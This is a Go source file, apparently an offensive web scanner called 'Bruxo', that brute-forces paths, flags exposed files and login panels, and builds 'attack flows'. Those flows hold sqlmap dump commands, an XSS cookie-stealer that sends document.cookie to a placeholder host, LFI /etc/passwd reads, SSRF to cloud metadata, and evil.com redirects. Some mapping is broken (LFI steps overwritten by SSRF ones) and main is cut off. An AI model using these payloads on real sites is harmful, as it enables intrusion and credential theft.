package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"html/template"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/valyala/fasthttp"
	"golang.org/x/time/rate"
)

const (
	ColorReset  = "\033[0m"
	ColorRed    = "\033[31m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorBlue   = "\033[34m"
	ColorCyan   = "\033[36m"
	ColorPurple = "\033[35m"
	ColorWhite  = "\033[37m"
	Bold        = "\033[1m"
)

type BruxoEngine struct {
	config         *Config
	results        []ScanResult
	progress       Progress
	visited        sync.Map
	mu             sync.Mutex
	logger         *Logger
	rateLimiter    *rate.Limiter
	ctx            context.Context
	cancel         context.CancelFunc
	workQueue      chan string
	resultsChan    chan ScanResult
	wg             sync.WaitGroup
	workerWg       sync.WaitGroup
	httpClient     *fasthttp.Client
	baseStatusCode int
	baseHash       uint32
	chatAnalysis   string
	attackScenarios []AttackScenario

	// C2 Fields
	c2Agents map[string]*Agent
	c2Tasks  map[string]*Task
	c2Mutex  sync.RWMutex
}

type Config struct {
	TargetURL         string
	WordlistPath      string
	NumThreads        int
	OutputFile        string
	Format            string
	ShowStatusCodes   []int
	FilterStatusCodes []int
	FilterExtensions  []string
	Extensions        []string
	RateLimit         int
	Verbose           bool
	Debug             bool
	Timeout           int
	FindHidden        bool
	GroqAPIKey        string
	EnableAttackFlow  bool
	RedTeamToolURL    string
}

type AttackStep struct {
	Stage   string `json:"Stage"`
	Command string `json:"Command"`
}

type AttackFlow []AttackStep

type AttackScenario struct {
	Objective          string   `json:"Objective"`
	Steps              []string `json:"Steps"`
	EstimatedTime      string   `json:"EstimatedTime"`
	SuccessProbability string   `json:"SuccessProbability"`
}

type Agent struct {
	ID        string    `json:"id"`
	IPAddress string    `json:"ip_address"`
	Hostname  string    `json:"hostname"`
	OS        string    `json:"os"`
	LastSeen  time.Time `json:"last_seen"`
	Status    string    `json:"status"`
	taskQueue chan Task `json:"-"` // Not serialized
}

type Task struct {
	ID      string `json:"id"`
	Command string `json:"command"`
	Result  string `json:"result"`
	Status  string `json:"status"` // e.g., "pending", "completed", "error"
}

type Vulnerability struct {
	Name               string     `json:"Name"`
	Severity           string     `json:"Severity"`
	Description        string     `json:"Description"`
	Recommendation     string     `json:"Recommendation"`
	AttackFlow         AttackFlow `json:"AttackFlow,omitempty"`
	MITRETechniqueID   string     `json:"MITRETechniqueID,omitempty"`
	MITRETechniqueName string     `json:"MITRETechniqueName,omitempty"`
	MITRETechniqueURL  string     `json:"MITRETechniqueURL,omitempty"`
}

type Evidence struct {
	Type      string `json:"Type"`
	Value     string `json:"Value"`
	SourceURL string `json:"SourceURL"`
}

type ScanResult struct {
	URL             string            `json:"URL"`
	StatusCode      int               `json:"StatusCode"`
	ContentLength   int               `json:"ContentLength"`
	ResponseTime    time.Duration     `json:"ResponseTime"`
	ContentType     string            `json:"ContentType"`
	Headers         map[string]string `json:"Headers"`
	Title           string            `json:"Title"`
	Category        string            `json:"Category"`
	IsHidden        bool              `json:"IsHidden"`
	Error           string            `json:"Error"`
	AIAnalysis      string            `json:"AIAnalysis,omitempty"`
	Vulnerabilities []Vulnerability   `json:"Vulnerabilities,omitempty"`
	Evidences       []Evidence        `json:"Evidences,omitempty"`
}

type OpenAIRequest struct {
	Model    string          `json:"model"`
	Messages []OpenAIMessage `json:"messages"`
}

type OpenAIMessage struct {
	Role    string `json:"role"`
	Content string `json:"content"`
}

type OpenAIResponse struct {
	Choices []struct {
		Message OpenAIMessage `json:"message"`
	} `json:"choices"`
	Error *struct {
		Message string `json:"message"`
	} `json:"error"`
}

type Progress struct {
	startTime  time.Time
	totalPaths int64
	completed  int64
	found      int64
	hidden     int64
}

type Logger struct {
	verbose bool
	debug   bool
	mu      sync.Mutex
}

func (l *Logger) Info(format string, args ...interface{}) {
	l.mu.Lock()
	defer l.mu.Unlock()
	fmt.Printf(ColorCyan+"[INFO] "+ColorReset+format+"\n", args...)
}

func (l *Logger) Debug(format string, args ...interface{}) {
	if l.debug {
		l.mu.Lock()
		defer l.mu.Unlock()
		fmt.Printf(ColorYellow+"[DEBUG] "+ColorReset+format+"\n", args...)
	}
}

func (l *Logger) Error(format string, args ...interface{}) {
	l.mu.Lock()
	defer l.mu.Unlock()
	fmt.Fprintf(os.Stderr, ColorRed+"[ERROR] "+ColorReset+format+"\n", args...)
}

func simpleHash(data []byte) uint32 {
	var h uint32 = 2166136261
	for _, b := range data {
		h ^= uint32(b)
		h *= 16777619
	}
	return h
}

func NewBruxoEngine(config *Config) *BruxoEngine {
	ctx, cancel := context.WithCancel(context.Background())
	engine := &BruxoEngine{
		config:      config,
		results:     []ScanResult{},
		logger:      &Logger{verbose: config.Verbose, debug: config.Debug},
		rateLimiter: rate.NewLimiter(rate.Limit(config.RateLimit), config.RateLimit/10+1),
		ctx:         ctx,
		cancel:      cancel,
		httpClient: &fasthttp.Client{
			TLSConfig:           &tls.Config{InsecureSkipVerify: true},
			MaxConnsPerHost:     config.NumThreads,
			ReadTimeout:         time.Duration(config.Timeout) * time.Second,
			WriteTimeout:        time.Duration(config.Timeout) * time.Second,
			MaxIdleConnDuration: 90 * time.Second,
		},
		c2Agents: make(map[string]*Agent),
		c2Tasks:  make(map[string]*Task),
	}

	if config.FindHidden {
		engine.getBaseResponse()
	}

	return engine
}

func (b *BruxoEngine) getBaseResponse() {
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.SetRequestURI(b.config.TargetURL)
	req.Header.SetMethod("GET")
	req.Header.SetUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	err := b.httpClient.Do(req, resp)
	if err != nil {
		return
	}

	b.baseStatusCode = resp.StatusCode()
	b.baseHash = simpleHash(resp.Body())
	b.logger.Debug("Hash base: %d, Status base: %d", b.baseHash, b.baseStatusCode)
}

func (b *BruxoEngine) setupSignalHandler() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		fmt.Printf("\n\n%sRecebido sinal de interrupção. Finalizando...%s\n", ColorRed, ColorReset)
		b.cancel()
		b.workerWg.Wait()
		b.wg.Wait()
		os.Exit(1)
	}()
}

func (b *BruxoEngine) Scan() error {
	b.setupSignalHandler()
	b.progress.startTime = time.Now()
	b.workQueue = make(chan string, b.config.NumThreads)
	b.resultsChan = make(chan ScanResult, b.config.NumThreads)

	totalLines, err := countLines(b.config.WordlistPath)
	if err != nil {
		b.logger.Error("Could not count lines: %v", err)
	} else {
		atomic.StoreInt64(&b.progress.totalPaths, totalLines)
	}

	for i := 0; i < b.config.NumThreads; i++ {
		b.workerWg.Add(1)
		go b.worker()
	}

	b.wg.Add(1)
	go b.collectResults()
	b.wg.Add(1)
	go b.printProgressPeriodically()

	b.logger.Info("Performing initial check on the base target URL...")
	initialResult := b.scanURL(b.config.TargetURL)
	if initialResult.Error == "" && (b.shouldShowResult(initialResult.StatusCode) || initialResult.IsHidden) {
		atomic.AddInt64(&b.progress.found, 1)
		b.mu.Lock()
		b.results = append(b.results, initialResult)
		b.mu.Unlock()
	}

	go func() {
		defer close(b.workQueue)

		file, err := os.Open(b.config.WordlistPath)
		if err != nil {
			return
		}
		defer file.Close()

		baseURL, _ := url.Parse(b.config.TargetURL)
		scanner := bufio.NewScanner(file)

		for scanner.Scan() {
			select {
			case <-b.ctx.Done():
				return
			default:
				path := strings.TrimSpace(scanner.Text())
				if path == "" || b.isPathFiltered(path) {
					continue
				}

				if len(b.config.Extensions) > 0 {
					for _, ext := range b.config.Extensions {
						fullURL := *baseURL
						fullURL.Path = strings.TrimSuffix(baseURL.Path, "/") + "/" + strings.TrimPrefix(path+ext, "/")
						urlStr := fullURL.String()
						if _, loaded := b.visited.LoadOrStore(urlStr, true); !loaded {
							b.workQueue <- urlStr
						}
					}
				} else {
					fullURL := *baseURL
					fullURL.Path = strings.TrimSuffix(baseURL.Path, "/") + "/" + strings.TrimPrefix(path, "/")
					urlStr := fullURL.String()
					if _, loaded := b.visited.LoadOrStore(urlStr, true); !loaded {
						b.workQueue <- urlStr
					}
				}
			}
		}
	}()

	b.workerWg.Wait()
	close(b.resultsChan)

	b.cancel()

	b.wg.Wait()

	if b.config.GroqAPIKey != "" {
		fmt.Printf("\n%s\n", strings.Repeat("-", 60))
		b.logger.Info("Starting AI analysis (Groq) for each result...")
		b.showSpinner(b.ctx, "Analisando com IA")
		b.performBulkAIAnalysis()
		b.logger.Info("AI analysis complete.")
	}

	if b.config.EnableAttackFlow {
		for i := range b.results {
			result := &b.results[i]
			for j := range result.Vulnerabilities {
				vuln := &result.Vulnerabilities[j]
				b.generateAttackFlow(vuln, result.URL)
			}
		}
	}

	b.generateAttackScenarios()

	if b.config.RedTeamToolURL != "" {
		for i := range b.results {
			b.integrateWithRedTeamTool(&b.results[i])
		}
	}

	fmt.Println()
	b.printSummaryTable()

	if b.config.OutputFile != "" {
		if err := b.generateReport(); err != nil {
			b.logger.Error("Error generating report: %v", err)
		}
	}

	return nil
}

func (b *BruxoEngine) worker() {
	defer b.workerWg.Done()
	for urlStr := range b.workQueue {
		if b.ctx.Err() != nil {
			return
		}
		b.rateLimiter.Wait(b.ctx)
		result := b.scanURL(urlStr)
		b.resultsChan <- result
	}
}

func (b *BruxoEngine) scanURL(urlStr string) ScanResult {
	start := time.Now()

	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.SetRequestURI(urlStr)
	req.Header.SetMethod("GET")
	req.Header.SetUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	err := b.httpClient.Do(req, resp)
	if err != nil {
		return ScanResult{URL: urlStr, Error: err.Error()}
	}

	atomic.AddInt64(&b.progress.completed, 1)

	body := resp.Body()
	statusCode := resp.StatusCode()
	var isHidden bool

	if b.config.FindHidden && b.baseStatusCode != 0 {
		currentHash := simpleHash(body)
		if currentHash != b.baseHash && statusCode == b.baseStatusCode {
			isHidden = true
		}
	}

	headers := make(map[string]string)
	resp.Header.VisitAll(func(key, value []byte) {
		headers[string(key)] = string(value)
	})

	result := ScanResult{
		URL:           urlStr,
		StatusCode:    statusCode,
		ContentLength: len(body),
		ResponseTime:  time.Since(start),
		ContentType:   string(resp.Header.ContentType()),
		Headers:       headers,
		Category:      b.categorizePath(urlStr),
		IsHidden:      isHidden,
	}

	if b.shouldShowResult(statusCode) || isHidden {
		result.Title = extractTitle(body)
		b.analyzeVulnerabilities(&result, body)
		result.Evidences = b.collectEvidence(body, urlStr)
	}

	return result
}

func (b *BruxoEngine) collectResults() {
	defer b.wg.Done()

	for result := range b.resultsChan {
		if result.Error == "" {
			if result.IsHidden {
				atomic.AddInt64(&b.progress.hidden, 1)
			}

			if b.shouldShowResult(result.StatusCode) || result.IsHidden {
				atomic.AddInt64(&b.progress.found, 1)
				b.mu.Lock()
				b.results = append(b.results, result)
				b.mu.Unlock()
			}
		}
	}
}

func (b *BruxoEngine) shouldShowResult(statusCode int) bool {
	for _, code := range b.config.FilterStatusCodes {
		if code == statusCode {
			return false
		}
	}

	if len(b.config.ShowStatusCodes) > 0 {
		for _, code := range b.config.ShowStatusCodes {
			if code == statusCode {
				return true
			}
		}
		return false
	}

	return true
}

func (b *BruxoEngine) printProgress() {
	completed := atomic.LoadInt64(&b.progress.completed)
	total := atomic.LoadInt64(&b.progress.totalPaths)
	hidden := atomic.LoadInt64(&b.progress.hidden)
	duration := time.Since(b.progress.startTime).Seconds()

	if duration < 0.1 {
		duration = 0.1
	}

	rps := float64(completed) / duration
	percentage := float64(0)
	if total > 0 {
		percentage = (float64(completed) / float64(total)) * 100
	}

	fmt.Printf("\r%s[%.2f%%] Complete: %d/%d | Hidden: %d | RPS: %.0f%s",
		Bold, percentage, completed, total, hidden, rps, ColorReset)
}

func (b *BruxoEngine) printProgressPeriodically() {
	defer b.wg.Done()

	ticker := time.NewTicker(100 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			b.printProgress()
		case <-b.ctx.Done():
			b.printProgress()
			return
		}
	}
}

func (b *BruxoEngine) printSummaryTable() {
	sort.Slice(b.results, func(i, j int) bool {
		return b.results[i].StatusCode < b.results[j].StatusCode
	})

	fmt.Printf("\n\n%s--- 🔮 Scan Summary 🔮 ---%s\n", Bold, ColorReset)

	fmt.Printf("| %-8s | %-70s | %-15s | %-40s |\n", "STATUS", "URL", "SIZE", "TITLE")
	fmt.Printf("|%s|%s|%s|%s|\n", strings.Repeat("-", 10), strings.Repeat("-", 72), strings.Repeat("-", 17), strings.Repeat("-", 42))

	for _, res := range b.results {
		color := getStatusCodeColor(res.StatusCode)
		statusStr := fmt.Sprintf("%s%d%s", color, res.StatusCode, ColorReset)

		urlStr := res.URL
		if len(urlStr) > 68 {
			urlStr = urlStr[:65] + "..."
		}
		titleStr := res.Title
		if len(titleStr) > 38 {
			titleStr = titleStr[:35] + "..."
		}

		fmt.Printf("| %-17s | %-70s | %-15d | %-40s |\n", statusStr, urlStr, res.ContentLength, titleStr)
	}

	if b.config.FindHidden {
		fmt.Printf("\n%s[HIDDEN]%s %d URLs with different content detected\n",
			ColorPurple, ColorReset, atomic.LoadInt64(&b.progress.hidden))
	}

	fmt.Printf("\n%sScan completed in %.2f seconds. Total of %d URLs found.%s\n",
		ColorWhite, time.Since(b.progress.startTime).Seconds(), len(b.results), ColorReset)
}

func (b *BruxoEngine) generateReport() error {
	switch b.config.Format {
	case "json":
		data, err := json.MarshalIndent(b.results, "", "  ")
		if err != nil {
			return err
		}
		return os.WriteFile(b.config.OutputFile, data, 0644)
	case "html":
		return b.generateHTMLReport()
	}
	return fmt.Errorf("unsupported or unspecified format: %s", b.config.Format)
}

func (b *BruxoEngine) generateHTMLReport() error {
	funcMap := template.FuncMap{
		"json": func(v interface{}) (string, error) {
			b, err := json.Marshal(v)
			return string(b), err
		},
	}

	tmpl, err := template.New("report_template.html").Funcs(funcMap).ParseFiles("report_template.html")
	if err != nil {
		return fmt.Errorf("could not load HTML template: %w", err)
	}

	file, err := os.Create(b.config.OutputFile)
	if err != nil {
		return err
	}
	defer file.Close()

	data := struct {
		Results      []ScanResult
		TargetURL    string
		GeneratedAt  string
		TotalFound   int
		ChatAnalysis string
		AttackScenarios []AttackScenario
	}{
		Results:      b.results,
		TargetURL:    b.config.TargetURL,
		GeneratedAt:  time.Now().Format(time.RFC1123),
		TotalFound:   len(b.results),
		ChatAnalysis: b.chatAnalysis,
		AttackScenarios: b.attackScenarios,
	}

	return tmpl.Execute(file, data)
}

func (b *BruxoEngine) categorizePath(path string) string {
	path = strings.ToLower(path)
	switch {
	case strings.Contains(path, "admin"), strings.Contains(path, "login"), strings.Contains(path, "dashboard"):
		return "Admin/Login"
	case strings.HasSuffix(path, ".js"):
		return "JavaScript"
	case strings.Contains(path, "api/"):
		return "API"
	case strings.Contains(path, "config") || strings.Contains(path, ".env"):
		return "Configuration"
	default:
		return "General"
	}
}

func (b *BruxoEngine) analyzeVulnerabilities(result *ScanResult, body []byte) {
	if strings.HasSuffix(result.URL, "/.git/config") && result.StatusCode == 200 {
		vuln := Vulnerability{
			Name:           "Exposed Git Repository",
			Severity:       "Critical",
			Description:    "The .git/config file is publicly accessible. This can expose the entire source code, history, and potentially sensitive information.",
			Recommendation: "Immediately restrict access to the .git directory. Use tools like 'git-dumper' to download the source code and analyze it for secrets.",
		}
		result.Vulnerabilities = append(result.Vulnerabilities, vuln)
	}

	loginPaths := []string{"/login", "/admin", "/user", "/wp-login.php", "/administrator/"}
	for _, p := range loginPaths {
		if strings.Contains(result.URL, p) && result.StatusCode == 200 {
			vuln := Vulnerability{
				Name:           "Potential Login Panel",
				Severity:       "Medium",
				Description:    "A potential login panel was found. This could be a target for brute-force attacks or default credential testing.",
				Recommendation: "Attempt to identify the technology and test for default credentials. Consider running a brute-force attack with a common password list.",
			}
			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
			break
		}
	}

	sensitiveFiles := []string{".env", "wp-config.php", "config.json", "credentials", ".htpasswd"}
	for _, f := range sensitiveFiles {
		if strings.HasSuffix(result.URL, f) && result.StatusCode == 200 {
			vuln := Vulnerability{
				Name:           "Sensitive File Exposed",
				Severity:       "High",
				Description:    fmt.Sprintf("The file '%s' was found, which may contain sensitive information like database credentials, API keys, or other secrets.", f),
				Recommendation: "Immediately review the contents of the file and restrict access. Rotate any exposed credentials.",
			}
			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
			break
		}
	}

	if len(result.Headers) > 0 {
		if serverHeader, ok := result.Headers["Server"]; ok {
			vuln := Vulnerability{
				Name:           "Technology Disclosure (Server Header)",
				Severity:       "Informational",
				Description:    fmt.Sprintf("The Server header revealed the following technology: %s. This information can help an attacker find known vulnerabilities.", serverHeader),
				Recommendation: "Consider removing or obfuscating the Server header to avoid revealing specific software versions.",
			}
			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
		}

		missingHeaders := []string{}
		securityHeaders := []string{"Content-Security-Policy", "Strict-Transport-Security", "X-Content-Type-Options", "X-Frame-Options"}
		for _, h := range securityHeaders {
			if _, ok := result.Headers[h]; !ok {
				missingHeaders = append(missingHeaders, h)
			}
		}

		if len(missingHeaders) > 0 {
			vuln := Vulnerability{
				Name:           "Missing Security Headers",
				Severity:       "Low",
				Description:    fmt.Sprintf("The following security headers are missing: %s. Their absence can expose the application to attacks like clickjacking and cross-site scripting (XSS).", strings.Join(missingHeaders, ", ")),
				Recommendation: "Implement the missing security headers according to security best practices to harden the application.",
			}
			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
		}
	}

	if strings.Contains(string(result.ContentType), "text/html") {
		bodyStr := string(body)
		if strings.Contains(bodyStr, "SQL syntax") {
			vuln := Vulnerability{
				Name:           "SQL Injection",
				Severity:       "Critical",
				Description:    "The application returned a SQL error message, which strongly indicates a SQL Injection vulnerability.",
				Recommendation: "Use parameterized queries (prepared statements) to prevent SQL injection. Validate and sanitize all user input.",
			}
			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
		}
	}
}

func (b *BruxoEngine) generateAttackFlow(vuln *Vulnerability, targetURL string) {
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return
	}
	baseURL := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)

	switch vuln.Name {
	case "SQL Injection":
		vuln.AttackFlow = []AttackStep{
			{Stage: "Detecção", Command: fmt.Sprintf(`sqlmap -u \"%s\" --dbs --batch --risk=3 --level=5`, targetURL)},
			{Stage: "Exploração", Command: fmt.Sprintf(`sqlmap -u \"%s\" -D <database> --tables --batch`, targetURL)},
			{Stage: "Exfiltração", Command: fmt.Sprintf(`sqlmap -u \"%s\" -D <database> -T <tabela> --dump --batch`, targetURL)},
		}
		vuln.MITRETechniqueID = "T1190"
		vuln.MITRETechniqueName = "Exploit Public-Facing Application"
		vuln.MITRETechniqueURL = "https://attack.mitre.org/techniques/T1190/"
	case "Cross-Site Scripting (XSS)":
		vuln.AttackFlow = []AttackStep{
			{Stage: "Verificação", Command: `<script>alert(document.domain)</script>`},
			{Stage: "Exploração (Cookie Stealer)", Command: `<script>fetch('https://sua-maquina.com/?c='+document.cookie)</script>`},
			{Stage: "Pivoting (Redirecionamento)", Command: `document.location='https://site-interno-da-rede'`},
		}
		vuln.MITRETechniqueID = "T1059.007"
		vuln.MITRETechniqueName = "JavaScript"
		vuln.MITRETechniqueURL = "https://attack.mitre.org/techniques/T1059/007/"
	case "Exposed Git Repository":
		vuln.AttackFlow = []AttackStep{
			{Stage: "Clonar com git-dumper", Command: fmt.Sprintf(`git-dumper %s %s-git`, baseURL, parsedURL.Host)},
			{Stage: "Verificar Logs", Command: fmt.Sprintf(`cd %s-git && git log -p`, parsedURL.Host)},
			{Stage: "Extrair Código", Command: fmt.Sprintf(`cd %s-git && git checkout .`, parsedURL.Host)},
		}
		vuln.MITRETechniqueID = "T1552.001"
		vuln.MITRETechniqueName = "Unsecured Credentials: Code Repositories"
		vuln.MITRETechniqueURL = "https://attack.mitre.org/techniques/T1552/001/"
	case "Exposed Environment File (.env)", "Sensitive File Exposed":
		vuln.AttackFlow = []AttackStep{
			{Stage: "Baixar Arquivo", Command: fmt.Sprintf(`curl %s`, targetURL)},
			{Stage: "Inspecionar Conteúdo", Command: `cat <arquivo_baixado>`},
		}
		vuln.MITRETechniqueID = "T1552"
		vuln.MITRETechniqueName = "Unsecured Credentials"
		vuln.MITRETechniqueURL = "https://attack.mitre.org/techniques/T1552/"
	case "Local File Inclusion (LFI)":
		vuln.AttackFlow = []AttackStep{
			{Stage: "Ler /etc/passwd", Command: fmt.Sprintf(`curl \"%s?file=../../../../../../../../etc/passwd\"`, baseURL)},
			{Stage: "Ler Logs do Servidor (Log Poisoning)", Command: fmt.Sprintf(`curl \"%s?file=../../../../../../../../var/log/apache2/access.log\"`, baseURL)},
		}
		vuln.MITRETechniqueID = "T1083"
		vuln.MITRETechniqueName = "File and Directory Discovery"
		vuln.AttackFlow = []AttackStep{
			{Stage: "Acessar Metadados da Cloud (AWS)", Command: fmt.Sprintf(`curl \"%s?url=http://169.254.169.254/latest/meta-data/\"`, baseURL)},
			{Stage: "Escanear Portas Internas", Command: fmt.Sprintf(`curl \"%s?url=http://localhost:8080\"`, baseURL)},
		}
		vuln.MITRETechniqueID = "T1595.002"
		vuln.MITRETechniqueName = "Active Scanning: Vulnerability Scanning"
		vuln.MITRETechniqueURL = "https://attack.mitre.org/techniques/T1595/002/"
	case "Directory Traversal":
		vuln.AttackFlow = []AttackStep{
			{Stage: "Acessar /etc/passwd", Command: fmt.Sprintf(`curl \"%s/..%%2f..%%2f..%%2f..%%2fetc/passwd\"`, targetURL)},
		}
		vuln.MITRETechniqueID = "T1083"
		vuln.MITRETechniqueName = "File and Directory Discovery"
		vuln.MITRETechniqueURL = "https://attack.mitre.org/techniques/T1083/"
	case "Open Redirect":
		vuln.AttackFlow = []AttackStep{
			{Stage: "Redirecionamento para Site Malicioso", Command: fmt.Sprintf(`%s?redirect=https://evil.com`, targetURL)},
		}
		vuln.MITRETechniqueID = "T1571"
		vuln.MITRETechniqueName = "Non-Standard Port"
		vuln.MITRETechniqueURL = "https://attack.mitre.org/techniques/T1571/"
	}
}

var evidenceRegex = map[string]*regexp.Regexp{
	"JWT Token":         regexp.MustCompile(`eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*`),
	"API Key (Generic)": regexp.MustCompile(`(?i)(apikey|api_key|token|secret)['\"]?\s*[:=]\s*['\"]?[A-Za-z0-9-_]{20,}`),
	"SHA-256 Hash":      regexp.MustCompile(`\b[a-fA-F0-9]{64}\b`),
	"SHA-1 Hash":        regexp.MustCompile(`\b[a-fA-F0-9]{40}\b`),
	"MD5 Hash":          regexp.MustCompile(`\b[a-fA-F0-9]{32}\b`),
}

func (b *BruxoEngine) collectEvidence(body []byte, sourceURL string) []Evidence {
	var evidences []Evidence
	foundValues := make(map[string]bool)

	bodyStr := string(body)

	for name, re := range evidenceRegex {
		matches := re.FindAllString(bodyStr, -1)
		for _, match := range matches {
			if !foundValues[match] {
				evidences = append(evidences, Evidence{
					Type:      name,
					Value:     match,
					SourceURL: sourceURL,
				})
				foundValues[match] = true
			}
		}
	}
	return evidences
}

func (b *BruxoEngine) generateAttackScenarios() {
	// Exemplo de lógica para gerar um cenário de ataque
	var hasExposedGit, hasSensitiveFile bool
	for _, result := range b.results {
		for _, vuln := range result.Vulnerabilities {
			if vuln.Name == "Exposed Git Repository" {
				hasExposedGit = true
			}
			if vuln.Name == "Sensitive File Exposed" {
				hasSensitiveFile = true
			}
		}
	}

	if hasExposedGit && hasSensitiveFile {
		scenario := AttackScenario{
			Objective:          "Compromise Server via Exposed Credentials",
			Steps:              []string{"Find Exposed Git Repository", "Extract Sensitive Files (e.g., .env)", "Use Credentials to Access Services", "Achieve Initial Foothold"},
			EstimatedTime:      "1-2 hours",
			SuccessProbability: "90%",
		}
		b.attackScenarios = append(b.attackScenarios, scenario)
	}
}

func (b *BruxoEngine) integrateWithRedTeamTool(result *ScanResult) {
	for _, vuln := range result.Vulnerabilities {
		if vuln.Name == "SQL Injection" {
			b.logger.Info("Integrating with the Red Team tool for %s in %s", vuln.Name, result.URL)

			payload := map[string]string{
				"vulnerability": vuln.Name,
				"target":        result.URL,
				"technique":     "UNION-based",
			}
			jsonPayload, _ := json.Marshal(payload)

			req := fasthttp.AcquireRequest()
			resp := fasthttp.AcquireResponse()
			defer fasthttp.ReleaseRequest(req)
			defer fasthttp.ReleaseResponse(resp)

			req.SetRequestURI(b.config.RedTeamToolURL)
			req.Header.SetMethod("POST")
			req.Header.SetContentType("application/json")
			req.SetBody(jsonPayload)

			if err := b.httpClient.Do(req, resp); err != nil {
				b.logger.Error("Error contacting the Red Team tool API: %v", err)
				continue
			}

			if resp.StatusCode() == fasthttp.StatusOK {
				b.logger.Info("Payload generated successfully by the API for %s", result.URL)
				b.logger.Debug("API response: %s", string(resp.Body()))
			} else {
				b.logger.Error("Failed to generate payload by the API for %s. Status: %d", result.URL, resp.StatusCode())
			}
		}
	}
}

func getStatusCodeColor(statusCode int) string {
	switch {
	case statusCode >= 200 && statusCode < 300:
		return ColorGreen
	case statusCode >= 300 && statusCode < 400:
		return ColorBlue
	case statusCode >= 400 && statusCode < 500:
		return ColorYellow
	case statusCode >= 500:
		return ColorRed
	default:
		return ColorReset
	}
}

func countLines(filePath string) (int64, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return 0, err
	}
	defer file.Close()

	buf := make([]byte, 32*1024)
	count := int64(0)
	lineSep := []byte{'\n'}

	for {
		c, err := file.Read(buf)
		count += int64(bytes.Count(buf[:c], lineSep))
		if err == io.EOF {
			break
		}
		if err != nil {
			return 0, err
		}
	}
	return count, nil
}

var titleRegex = regexp.MustCompile(`(?i)<title>(.*?)</title>`)

func extractTitle(body []byte) string {
	matches := titleRegex.FindSubmatch(body)
	if len(matches) > 1 {
		return string(matches[1])
	}
	return ""
}

func (b *BruxoEngine) performBulkAIAnalysis() {
	// Implementação da análise em massa com IA
}

func (b *BruxoEngine) getAIAnalysisForURL(result *ScanResult) (string, error) {
	if b.config.GroqAPIKey == "" {
		return "", fmt.Errorf("Groq API key not provided")
	}

	client := &http.Client{Timeout: 30 * time.Second}

	var bodySnippet string
	// Implementar a lógica para obter o body do resultado
	// bodySnippet = string(result.Body)[:200]

	prompt := fmt.Sprintf("Analyze the following HTTP response from the URL %s and identify potential vulnerabilities. Provide a brief, one-paragraph summary. Response headers: %v. Response body snippet: %s",
		result.URL, result.Headers, bodySnippet)

	requestBody, err := json.Marshal(OpenAIRequest{
		Model: "llama3-8b-8192",
		Messages: []OpenAIMessage{
			{Role: "system", Content: "You are a cybersecurity expert. Analyze the provided HTTP response for security flaws."},
			{Role: "user", Content: prompt},
		},
	})
	if err != nil {
		return "", err
	}

	req, err := http.NewRequest("POST", "https://api.groq.com/openai/v1/chat/completions", bytes.NewBuffer(requestBody))
	if err != nil {
		return "", err
	}

	req.Header.Set("Authorization", "Bearer "+b.config.GroqAPIKey)
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	var openAIResp OpenAIResponse
	if err := json.NewDecoder(resp.Body).Decode(&openAIResp); err != nil {
		return "", err
	}

	if openAIResp.Error != nil {
		return "", fmt.Errorf("Groq API error: %s", openAIResp.Error.Message)
	}

	if len(openAIResp.Choices) > 0 {
		return openAIResp.Choices[0].Message.Content, nil
	}

	return "No analysis available.", nil
}

func (b *BruxoEngine) isPathFiltered(path string) bool {
	for _, ext := range b.config.FilterExtensions {
		if strings.HasSuffix(path, ext) {
			return true
		}
	}
	return false
}

func (b *BruxoEngine) showSpinner(ctx context.Context, message string) {
	spinner := []string{"-", "\\", "|", "/"}
	i := 0
	ticker := time.NewTicker(100 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			fmt.Printf("\r%s... Done!          \n", message)
			return
		case <-ticker.C:
			fmt.Printf("\r%s %s ", message, spinner[i])
			i = (i + 1) % len(spinner)
		}
	}
}

func main() {
	var config Config
	var showCodes, filterCodes, extensions, filterExtensions string

	flag.StringVar(&config.TargetURL, "u", "", "Target URL (e.g., http://example.com)")
	flag.StringVar(&config.WordlistPath, "w", "", "Path to the wordlist file")
	flag.IntVar(&config.NumThreads, "t", 50, "Number of concurrent threads")
	flag.StringVar(&config.OutputFile, "o", "", "Output file name")
	flag.StringVar(&config.Format, "f", "html", "Output format (json, html)")
	flag.StringVar(&showCodes, "sc", "200,204,301,302,307,403", "Show specific status codes (comma-separated)")
	flag.StringVar(&filterCodes, "fc", "", "Filter specific status codes (comma-separated)")
	flag.StringVar(&extensions, "e", "", "Append extensions to wordlist entries (e.g., .php,.html)")
	flag.StringVar(&filterExtensions, "fx", "css,js,png,jpg,jpeg,svg,ico,woff,woff2,eot,ttf", "Filter out specific extensions (comma-separated)")
	flag.IntVar(&config.RateLimit, "rl", 1000, "Rate limit in requests per second")
	flag.BoolVar(&config.Verbose, "v", false, "Verbose mode")
	flag.BoolVar(&config.Debug, "debug", false, "Debug mode")
	flag.IntVar(&config.Timeout, "timeout", 10, "Request timeout in seconds")
	flag.BoolVar(&config.FindHidden, "hidden", false, "Find hidden paths by comparing response with a non-existent path")
